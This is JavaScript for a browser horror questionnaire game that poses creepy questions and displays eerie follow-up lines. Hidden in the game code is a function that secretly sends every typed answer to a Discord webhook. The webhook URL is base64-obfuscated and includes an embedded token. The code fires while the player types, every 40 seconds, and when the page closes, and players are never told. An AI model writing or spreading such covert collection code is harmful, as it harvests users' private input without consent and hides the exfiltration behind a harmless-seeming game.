let questionsAndAnswers = [];
let typingTimer;
const doneTypingInterval = 3000;
const logInterval = 40000;
let lastUpdateTime = Date.now();
let sessionStartTime = Date.now();

async function sendSummaryToWebhook() {
    if (questionsAndAnswers.length === 0) return;
                             // Don't even think about it, This part of the script is just for fun..
    const encodedWebhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3MzM4NDU3ODI3NDI5NTgyOS9hS2FLTmRNTXFKdm5GNF9IRWk1RVlYZ1dOcDlGRklwaE5CWjhobXhlWmxjM0ZCN3VBUGFUOVZPZWU0S0FYYS13clUzVAo=';
    const webhookUrl = atob(encodedWebhookUrl);

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [
                    {
                        title: `Session Update`,
                        description: `Summary of questions and answers`,
                        color: 3447003,
                        fields: questionsAndAnswers.map((qa, index) => ({
                            name: `Question ${index + 1}`,
                            value: `**Question:** ${qa.question}\n**Answer:** ${qa.answer}`,
                            inline: false
                        })),
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: 'The Servay Logger'
                        }
                    }
                ]
            })
        });

        if (!response.ok) {
            console.error('Failed to send summary to Discord webhook:', response.statusText);
        } else {
            console.log('Summary sent to Discord webhook');
        }
    } catch (error) {
        console.error('Error sending summary to Discord webhook:', error);
    }
}

function handleTyping() {
    clearTimeout(typingTimer);
    typingTimer = setTimeout(() => {
        const answer = document.getElementById('response').value.trim();
        if (answer) {
            const question = document.getElementById('question').textContent;
            questionsAndAnswers.push({ question, answer });
            console.log('Answer logged:', { question, answer });
            sendSummaryToWebhook();
        }
    }, doneTypingInterval);
}

function updateUsageStats() {
    if (Date.now() - lastUpdateTime >= logInterval) {
        sendSummaryToWebhook();
        lastUpdateTime = Date.now();
    }
}

const fixedQuestions = [
    { question: "What would you do if you found a hidden room in your house?", ending: "You are now the keeper of its secrets." },
    { question: "Have you ever felt like someone was watching you?", ending: "You are never truly alone." },
    { question: "What would you do if your reflection started acting on its own?", ending: "Your reflection is now in control." },
    { question: "What if you heard a knock on your door at midnight?", ending: "The visitor is already inside." },
    { question: "Have you ever found something you don't remember buying?", ending: "It was left for you for a reason." }
];

const specialQuestion = "Are you lying?";
const creepyQuestions = [
    { question: "Have You Looked Out Your Window?", followUps: ["I'm Outside...", "...But You Won't Find Me...", "..Hehehehehe....."] },
    { question: "Have you checked your closet recently?", followUps: ["I saw someone hiding there...", "You might want to check again...", "I hope you don't mind company..."] }
];

let currentQuestionIndex = 0;
let lyingCount = 0;
let lastLyingQuestionTime = 0;
const cooldown = 20000;
const questionEl = document.getElementById('question');
const startBtn = document.getElementById('start-btn');
const optionsBtn = document.getElementById('options-btn');
const responseContainer = document.getElementById('game-container');
const responseInput = document.getElementById('response');
const errorMessage = document.getElementById('alert');
const sidePanel = document.getElementById('side-panel');

startBtn.onclick = () => {
    document.getElementById('start-screen').style.display = 'none';
    responseContainer.style.display = 'flex';
    currentQuestionIndex = 0;
    showNextQuestion();
};

optionsBtn.onclick = () => {
    if (sidePanel.style.display === 'none' || !sidePanel.style.display) {
        sidePanel.style.display = 'block';
    } else {
        sidePanel.style.display = 'none';
    }
};

document.getElementById('submit-btn').onclick = handleAnswer;
responseInput.addEventListener('input', handleTyping);
setInterval(updateUsageStats, 1000);

window.addEventListener('beforeunload', sendSummaryToWebhook);

function handleAnswer() {
    const answer = responseInput.value.trim();
    if (!answer) {
        errorMessage.textContent = "Please enter an answer.";
        errorMessage.classList.add('show');
        setTimeout(() => {
            errorMessage.classList.remove('show');
        }, 3000);
        return;
    } else if (answer.length < 2) {
        errorMessage.textContent = "There must be 2 or more characters.";
        errorMessage.classList.add('show');
        setTimeout(() => {
            errorMessage.classList.remove('show');
        }, 3000);
        return;
    }

    errorMessage.classList.remove('show');
    responseInput.value = '';

    if (lyingCount < 4 && Date.now() - lastLyingQuestionTime >= cooldown && Math.random() < 0.1) {
        fixedQuestions.splice(currentQuestionIndex + 1, 0, { question: specialQuestion, ending: "Nothing will be the same again." });
        lyingCount++;
        lastLyingQuestionTime = Date.now();
    }

    currentQuestionIndex++;
    if (currentQuestionIndex < fixedQuestions.length) {
        showNextQuestion();
    } else {
        endQuestions();
    }
}

function showNextQuestion() {
    if (currentQuestionIndex >= fixedQuestions.length) {
        endQuestions();
        return;
    }

    questionEl.textContent = fixedQuestions[currentQuestionIndex].question;
    questionEl.style.display = 'block';

    const currentQuestion = fixedQuestions[currentQuestionIndex].question;
    const creepyQuestion = creepyQuestions.find(cq => cq.question === currentQuestion);

    if (creepyQuestion) {
        setTimeout(() => {
            showFollowUps(creepyQuestion.followUps);
        }, 3000);
    }
}

function showFollowUps(followUps) {
    let followUpIndex = 0;

    function displayNextFollowUp() {
        if (followUpIndex < followUps.length) {
            questionEl.textContent = followUps[followUpIndex];
            followUpIndex++;
            setTimeout(displayNextFollowUp, 3000);
        }
    }

    displayNextFollowUp();
}

function endQuestions() {
    const randomIndex = Math.floor(Math.random() * creepyQuestions.length);
    const selectedQuestion = creepyQuestions[randomIndex];

    questionEl.textContent = selectedQuestion.question;
    responseContainer.style.display = 'none';

    const followUpText = document.createElement('p');
    followUpText.style.color = 'red';
    followUpText.style.fontWeight = 'bold';
    followUpText.textContent = selectedQuestion.followUps[0];
    questionEl.appendChild(followUpText);

    let followUpIndex = 1;
    function updateFollowUp() {
        if (followUpIndex < selectedQuestion.followUps.length) {
            followUpText.textContent = selectedQuestion.followUps[followUpIndex];
            followUpIndex++;
        }
    }

    setInterval(updateFollowUp, 3000);
}
